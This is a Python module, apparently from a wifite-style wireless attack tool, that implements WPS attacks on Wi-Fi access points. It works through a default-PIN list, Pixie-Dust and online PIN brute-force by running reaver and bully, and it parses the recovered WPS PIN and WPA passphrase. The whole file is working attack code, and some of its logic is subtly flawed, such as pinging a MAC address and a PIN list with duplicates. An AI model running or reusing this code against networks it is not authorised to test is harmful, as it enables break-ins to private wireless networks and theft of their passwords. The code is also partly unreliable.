#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..util.color import Color
from ..util.process import Process
from ..config import Configuration
from ..tools.bully import Bully
from ..tools.reaver import Reaver
from ..model.wps_result import CrackResultWPS
import time
import re

class AttackWPS(Attack):

    @staticmethod
    def can_attack_wps():
        '''Check if WPS attack tools are available'''
        try:
            return Reaver.exists() or Bully.exists()
        except Exception:
            return False

    def __init__(self, target, pixie_dust=False, default_pins=False):
        super(AttackWPS, self).__init__(target)
        self.success = False
        self.crack_result = None
        self.pixie_dust = pixie_dust
        self.default_pins = default_pins
        
        # Common default WPS PINs (most common first)
        self.common_pins = [
            '00000000', '12345670', '12345678', '01234567',
            '11111111', '22222222', '33333333', '44444444',
            '55555555', '66666666', '77777777', '88888888',
            '99999999', '00000001', '12345679', '87654321',
            '00000001', '00000002', '00000003', '00000004',
            '00000005', '00000006', '00000007', '00000008',
            '00000009', '12345600', '12345601', '12345602',
            '12345603', '12345604', '12345605', '12345606',
            '12345607', '12345608', '12345609', '12345680',
            '12345681', '12345682', '12345683', '12345684',
            '12345685', '12345686', '12345687', '12345688',
            '12345689', '12345690', '12345691', '12345692',
            '12345693', '12345694', '12345695', '12345696',
            '12345697', '12345698', '12345699'
        ]
        
        # Validate target has required attributes
        self.validate_target(['bssid', 'channel', 'wps'])

    def check_target_reachability(self):
        """Check if target is reachable before starting attack"""
        try:
            import subprocess
            
            # Quick ping test to see if target is reachable
            cmd = ['ping', '-c', '1', '-W', '2', self.target.bssid]
            result = subprocess.run(cmd, capture_output=True, timeout=3)
            
            if result.returncode == 0:
                return True
            else:
                # Target might not respond to ping, but could still be reachable
                # Try a quick airodump scan to verify target is still broadcasting
                cmd = ['airodump-ng', '-c', str(self.target.channel), 
                       '--bssid', self.target.bssid, Configuration.interface]
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                         stderr=subprocess.PIPE, text=True)
                
                try:
                    stdout, stderr = process.communicate(timeout=3)
                    return self.target.bssid in stdout
                except subprocess.TimeoutExpired:
                    process.kill()
                    return True  # Assume reachable if scan times out
                    
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {O}Reachability check failed: %s{W}' % str(e))
            return True  # Assume reachable if check fails

    def run(self):
        ''' Run all WPS-related attacks with optimized sequence '''
        
        try:
            # Check if target is reachable before starting attack
            if not self.check_target_reachability():
                Color.pl('{!} {R}Target not reachable - skipping WPS attack{W}')
                return False
            
            # Determine attack type for logging
            if self.default_pins:
                attack_type = "WPS Default PIN"
            elif self.pixie_dust:
                attack_type = "WPS Pixie-Dust"
            else:
                attack_type = "WPS PIN"
                
            Color.pattack(attack_type, self.target, 'Starting WPS attack', 'Initializing')
            
            # Drop out if user specified to not use Reaver/Bully
            if Configuration.use_pmkid_only:
                Color.pl('\r{!} {O}Skipping WPS attack because {R}--pmkid-only{O} is set{W}')
                Color.pattack(attack_type, self.target, 'WPS Attack', 'Skipped - PMKID only mode')
                self.success = False
                return self.success

            if Configuration.no_wps:
                Color.pl('\r{!} {O}Skipping WPS attack because {R}--no-wps{O} is set{W}')
                Color.pattack(attack_type, self.target, 'WPS Attack', 'Skipped - WPS disabled')
                self.success = False
                return self.success

            # Check if any WPS tools are available
            if not AttackWPS.can_attack_wps():
                Color.pl('\r{!} {R}No WPS attack tools available (reaver/bully not found){W}')
                Color.pattack(attack_type, self.target, 'WPS Attack', 'Failed - No tools available')
                self.success = False
                return self.success

            # Run optimized attack sequence
            return self.run_optimized_attack_sequence()
                
        except KeyboardInterrupt:
            Color.pl('\n{!} {O}WPS attack interrupted by user{W}')
            self.success = False
            return self.success
        except Exception as e:
            Color.pl('\n{!} {R}Error during WPS attack: {O}%s{W}' % str(e))
            if Configuration.verbose > 0:
                Color.pexception(e)
            self.success = False
            return self.success

    def run_optimized_attack_sequence(self):
        '''Run WPS attacks in optimized order: Default PINs -> Pixie-Dust -> PIN Brute-force'''
        
        # 1. Try Default PIN Attack first (fastest)
        if self.default_pins or getattr(Configuration, 'wps_default_pins', True):
            Color.pl('\n{+} {C}Starting WPS Default PIN Attack{W}')
            Color.pattack('WPS Default PIN', self.target, 'Trying common default PINs', 'Starting')
            
            if self.run_default_pin_attack():
                Color.pl('\n{+} {G}WPS Default PIN Attack successful!{W}')
                return True
            else:
                Color.pl('\n{!} {O}WPS Default PIN Attack failed, trying other methods...{W}')
        
        # 2. Try Pixie-Dust Attack (very fast for vulnerable devices)
        if self.pixie_dust or (not self.default_pins and getattr(Configuration, 'wps_pixie', True)):
            Color.pl('\n{+} {C}Starting WPS Pixie-Dust Attack{W}')
            Color.pattack('WPS Pixie-Dust', self.target, 'Running Pixie-Dust attack', 'Starting')
            
            if self.run_pixie_dust_attack():
                Color.pl('\n{+} {G}WPS Pixie-Dust Attack successful!{W}')
                return True
            else:
                Color.pl('\n{!} {O}WPS Pixie-Dust Attack failed, trying PIN brute-force...{W}')
        
        # 3. Try PIN Brute-force Attack (slowest, last resort)
        if not self.pixie_dust or getattr(Configuration, 'wps_pin', True):
            Color.pl('\n{+} {C}Starting WPS PIN Brute-force Attack{W}')
            Color.pattack('WPS PIN', self.target, 'Running PIN brute-force', 'Starting')
            
            if self.run_pin_bruteforce_attack():
                Color.pl('\n{+} {G}WPS PIN Brute-force Attack successful!{W}')
                return True
            else:
                Color.pl('\n{!} {R}All WPS attack methods failed{W}')
        
        return False

    def run_default_pin_attack(self):
        """Try common default PINs first (fastest attack)"""
        try:
            Color.pl('\n{+} {C}Starting WPS Default PIN Attack{W}')
            
            # Check if we have any WPS tools available
            if not Reaver.exists() and not Bully.exists():
                Color.pl('{!} {R}No WPS tools available (reaver/bully not found){W}')
                return False
            
            for i, pin in enumerate(self.common_pins):
                # Update progress with GUI integration
                Color.pattack('WPS Default PIN', self.target, 'Trying common default PINs', 
                             'PIN {G}%d{W}/{G}%d{W}: {G}%s{W}' % (i+1, len(self.common_pins), pin))
                
                Color.pl('{+} {C}Trying default PIN {G}%d{W}/{G}%d{W}: {G}%s{W}' % 
                        (i+1, len(self.common_pins), pin))
                
                # Try with reaver first
                if Reaver.exists():
                    success = self.try_pin_with_reaver(pin)
                    if success:
                        Color.pl('{+} {G}WPS Default PIN Attack successful!{W}')
                        return True
                
                # Try with bully if reaver failed
                if Bully.exists():
                    success = self.try_pin_with_bully(pin)
                    if success:
                        Color.pl('{+} {G}WPS Default PIN Attack successful!{W}')
                        return True
                
                # Small delay between attempts to avoid overwhelming the AP
                time.sleep(0.5)
                
            Color.pl('{!} {O}WPS Default PIN Attack failed - no common PINs worked{W}')
            return False
            
        except KeyboardInterrupt:
            Color.pl('\n{!} {O}WPS Default PIN Attack interrupted by user{W}')
            return False
        except Exception as e:
            Color.pl('\n{!} {R}Error in Default PIN Attack: {O}%s{W}' % str(e))
            if Configuration.verbose > 0:
                Color.pexception(e)
            return False

    def run_pixie_dust_attack(self):
        """Run Pixie-Dust attack using appropriate tool"""
        try:
            if not Reaver.exists() and Bully.exists():
                return self.run_bully_pixie_dust()
            elif self.pixie_dust and not Reaver.is_pixiedust_supported() and Bully.exists():
                return self.run_bully_pixie_dust()
            elif Configuration.use_bully:
                return self.run_bully_pixie_dust()
            elif not Reaver.exists():
                Color.pl('\r{!} {R}Skipping WPS Pixie-Dust attack: {O}reaver{R} not found.{W}')
                return False
            elif self.pixie_dust and not Reaver.is_pixiedust_supported():
                Color.pl('\r{!} {R}Skipping WPS attack: {O}reaver{R} does not support {O}--pixie-dust{W}')
                return False
            else:
                return self.run_reaver_pixie_dust()
                
        except Exception as e:
            Color.pl('\n{!} {R}Error in Pixie-Dust Attack: {O}%s{W}' % str(e))
            if Configuration.verbose > 0:
                Color.pexception(e)
            return False

    def run_pin_bruteforce_attack(self):
        """Run PIN brute-force attack using appropriate tool"""
        try:
            if not Reaver.exists() and Bully.exists():
                return self.run_bully_pin_bruteforce()
            elif Configuration.use_bully:
                return self.run_bully_pin_bruteforce()
            elif not Reaver.exists():
                Color.pl('\r{!} {R}Skipping WPS PIN attack: {O}reaver{R} not found.{W}')
                return False
            else:
                return self.run_reaver_pin_bruteforce()
                
        except Exception as e:
            Color.pl('\n{!} {R}Error in PIN Brute-force Attack: {O}%s{W}' % str(e))
            if Configuration.verbose > 0:
                Color.pexception(e)
            return False

    def try_pin_with_reaver(self, pin):
        """Try specific PIN with reaver"""
        cmd = [
            'reaver', '-i', Configuration.interface,
            '-b', self.target.bssid,
            '-c', str(self.target.channel),
            '-p', pin,
            '-vv', '-t', '2', '-T', '2'  # Faster timeouts for default PIN testing
        ]
        
        try:
            import subprocess
            import signal
            import os
            
            # Start process with timeout
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid
            )
            
            try:
                # Wait for process with timeout (5 seconds per PIN)
                stdout, stderr = process.communicate(timeout=5)
                
                # Check if PIN was successful
                if stdout and ('WPS pin:' in stdout or 'WPA PSK:' in stdout):
                    self.parse_reaver_success(stdout, pin)
                    return True
                    
            except subprocess.TimeoutExpired:
                # Kill the process if it times out
                try:
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                except:
                    pass
                process.kill()
                
                if Configuration.verbose > 1:
                    Color.pl('{!} {O}Reaver timeout for PIN %s{W}' % pin)
                    
        except Exception as e:
            if Configuration.verbose > 0:
                Color.pl('{!} {R}Reaver error with PIN %s: {O}%s{W}' % (pin, str(e)))
        
        return False

    def try_pin_with_bully(self, pin):
        """Try specific PIN with bully"""
        cmd = [
            'bully', '--bssid', self.target.bssid,
            '--channel', str(self.target.channel),
            '--pin', pin,
            '--force',
            Configuration.interface
        ]
        
        try:
            import subprocess
            import signal
            import os
            
            # Start process with timeout
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid
            )
            
            try:
                # Wait for process with timeout (5 seconds per PIN)
                stdout, stderr = process.communicate(timeout=5)
                
                # Check if PIN was successful
                if stdout and ('Pin is' in stdout and 'key is' in stdout):
                    self.parse_bully_success(stdout, pin)
                    return True
                    
            except subprocess.TimeoutExpired:
                # Kill the process if it times out
                try:
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                except:
                    pass
                process.kill()
                
                if Configuration.verbose > 1:
                    Color.pl('{!} {O}Bully timeout for PIN %s{W}' % pin)
                    
        except Exception as e:
            if Configuration.verbose > 0:
                Color.pl('{!} {R}Bully error with PIN %s: {O}%s{W}' % (pin, str(e)))
        
        return False

    def parse_reaver_success(self, output, pin):
        """Parse successful reaver output and create crack result"""
        try:
            # Extract PIN, PSK, and SSID from reaver output
            pin_match = re.search(r"WPS pin:\s*([0-9]+)", output, re.IGNORECASE)
            psk_match = re.search(r"WPA PSK:\s*'(.+)'", output)
            ssid_match = re.search(r"AP SSID:\s*'(.*)'", output)
            
            if pin_match:
                cracked_pin = pin_match.group(1)
                cracked_psk = psk_match.group(1) if psk_match else None
                cracked_ssid = ssid_match.group(1) if ssid_match else self.target.essid
                
                self.crack_result = CrackResultWPS(
                    self.target.bssid,
                    cracked_ssid,
                    cracked_pin,
                    cracked_psk
                )
                
                Color.pl('\n{+} {G}Reaver found PIN: {C}%s{W}' % cracked_pin)
                if cracked_psk:
                    Color.pl('{+} {G}Reaver found PSK: {C}%s{W}' % cracked_psk)
                
                return True
        except Exception as e:
            Color.pl('\n{!} {R}Error parsing reaver success: {O}%s{W}' % str(e))
        
        return False

    def parse_bully_success(self, output, pin):
        """Parse successful bully output and create crack result"""
        try:
            # Extract PIN and PSK from bully output
            pin_key_re = re.search(r"Pin is '(\d*)', key is '(.*)'", output)
            if pin_key_re:
                cracked_pin = pin_key_re.group(1)
                cracked_psk = pin_key_re.group(2)
                
                self.crack_result = CrackResultWPS(
                    self.target.bssid,
                    self.target.essid,
                    cracked_pin,
                    cracked_psk
                )
                
                Color.pl('\n{+} {G}Bully found PIN: {C}%s{W}' % cracked_pin)
                Color.pl('{+} {G}Bully found PSK: {C}%s{W}' % cracked_psk)
                
                return True
        except Exception as e:
            Color.pl('\n{!} {R}Error parsing bully success: {O}%s{W}' % str(e))
        
        return False

    def run_bully_pixie_dust(self):
        """Run Pixie-Dust attack with Bully"""
        try:
            Color.pl('\n{+} {C}Starting WPS Pixie-Dust attack with Bully{W}')
            bully = Bully(self.target, pixie_dust=True)
            bully.run()
            bully.stop()
            self.crack_result = bully.crack_result
            self.success = self.crack_result is not None
            
            if self.success:
                Color.pl('\n{+} {G}WPS Pixie-Dust attack successful with Bully{W}')
            else:
                Color.pl('\n{!} {R}WPS Pixie-Dust attack failed with Bully{W}')
                
            return self.success
            
        except Exception as e:
            Color.pl('\n{!} {R}Error running Bully Pixie-Dust: {O}%s{W}' % str(e))
            if Configuration.verbose > 0:
                Color.pexception(e)
            return False

    def run_reaver_pixie_dust(self):
        """Run Pixie-Dust attack with Reaver"""
        try:
            Color.pl('\n{+} {C}Starting WPS Pixie-Dust attack with Reaver{W}')
            reaver = Reaver(self.target, pixie_dust=True)
            reaver.run()
            self.crack_result = reaver.crack_result
            self.success = self.crack_result is not None
            
            if self.success:
                Color.pl('\n{+} {G}WPS Pixie-Dust attack successful with Reaver{W}')
            else:
                Color.pl('\n{!} {R}WPS Pixie-Dust attack failed with Reaver{W}')
                
            return self.success
            
        except Exception as e:
            Color.pl('\n{!} {R}Error running Reaver Pixie-Dust: {O}%s{W}' % str(e))
            if Configuration.verbose > 0:
                Color.pexception(e)
            return False

    def run_bully_pin_bruteforce(self):
        """Run PIN brute-force attack with Bully"""
        try:
            Color.pl('\n{+} {C}Starting WPS PIN brute-force attack with Bully{W}')
            bully = Bully(self.target, pixie_dust=False)
            bully.run()
            bully.stop()
            self.crack_result = bully.crack_result
            self.success = self.crack_result is not None
            
            if self.success:
                Color.pl('\n{+} {G}WPS PIN brute-force attack successful with Bully{W}')
            else:
                Color.pl('\n{!} {R}WPS PIN brute-force attack failed with Bully{W}')
                
            return self.success
            
        except Exception as e:
            Color.pl('\n{!} {R}Error running Bully PIN brute-force: {O}%s{W}' % str(e))
            if Configuration.verbose > 0:
                Color.pexception(e)
            return False

    def run_reaver_pin_bruteforce(self):
        """Run PIN brute-force attack with Reaver"""
        try:
            Color.pl('\n{+} {C}Starting WPS PIN brute-force attack with Reaver{W}')
            reaver = Reaver(self.target, pixie_dust=False)
            reaver.run()
            self.crack_result = reaver.crack_result
            self.success = self.crack_result is not None
            
            if self.success:
                Color.pl('\n{+} {G}WPS PIN brute-force attack successful with Reaver{W}')
            else:
                Color.pl('\n{!} {R}WPS PIN brute-force attack failed with Reaver{W}')
                
            return self.success
            
        except Exception as e:
            Color.pl('\n{!} {R}Error running Reaver PIN brute-force: {O}%s{W}' % str(e))
            if Configuration.verbose > 0:
                Color.pexception(e)
            return False

    def run_bully(self):
        '''Run WPS attack using Bully tool'''
        try:
            Color.pl('\n{+} {C}Starting WPS attack with Bully{W}')
            bully = Bully(self.target, pixie_dust=self.pixie_dust)
            bully.run()
            bully.stop()
            self.crack_result = bully.crack_result
            self.success = self.crack_result is not None
            
            if self.success:
                Color.pl('\n{+} {G}WPS attack successful with Bully{W}')
            else:
                Color.pl('\n{!} {R}WPS attack failed with Bully{W}')
                
            return self.success
            
        except Exception as e:
            Color.pl('\n{!} {R}Error running Bully: {O}%s{W}' % str(e))
            if Configuration.verbose > 0:
                Color.pexception(e)
            self.success = False
            return self.success


    def run_reaver(self):
        '''Run WPS attack using Reaver tool'''
        try:
            Color.pl('\n{+} {C}Starting WPS attack with Reaver{W}')
            reaver = Reaver(self.target, pixie_dust=self.pixie_dust)
            reaver.run()
            self.crack_result = reaver.crack_result
            self.success = self.crack_result is not None
            
            if self.success:
                Color.pl('\n{+} {G}WPS attack successful with Reaver{W}')
            else:
                Color.pl('\n{!} {R}WPS attack failed with Reaver{W}')
                
            return self.success
            
        except Exception as e:
            Color.pl('\n{!} {R}Error running Reaver: {O}%s{W}' % str(e))
            if Configuration.verbose > 0:
                Color.pexception(e)
            self.success = False
            return self.success

    def get_attack_type_description(self):
        '''Get description of the attack type being performed'''
        if self.default_pins:
            return 'Default PIN'
        elif self.pixie_dust:
            return 'Pixie-Dust'
        else:
            return 'PIN Brute-force'
            
    def get_tool_preference(self):
        '''Get the preferred tool for this attack'''
        if not Reaver.exists() and Bully.exists():
            return 'Bully (Reaver not available)'
        elif self.pixie_dust and not Reaver.is_pixiedust_supported() and Bully.exists():
            return 'Bully (Reaver Pixie-Dust not supported)'
        elif Configuration.use_bully:
            return 'Bully (user preference)'
        elif Reaver.exists():
            return 'Reaver'
        else:
            return 'None available'

    @staticmethod
    def get_available_attack_types():
        """Get list of available WPS attack types"""
        attack_types = []
        
        if AttackWPS.can_attack_wps():
            attack_types.append('Default PIN')
            attack_types.append('Pixie-Dust')
            attack_types.append('PIN Brute-force')
        
        return attack_types

    @staticmethod
    def get_attack_description(attack_type):
        """Get description for specific attack type"""
        descriptions = {
            'Default PIN': 'Try common default WPS PINs (fastest)',
            'Pixie-Dust': 'Offline brute-force against WPS vulnerabilities',
            'PIN Brute-force': 'Online brute-force against WPS PIN authentication'
        }
        return descriptions.get(attack_type, 'Unknown attack type')

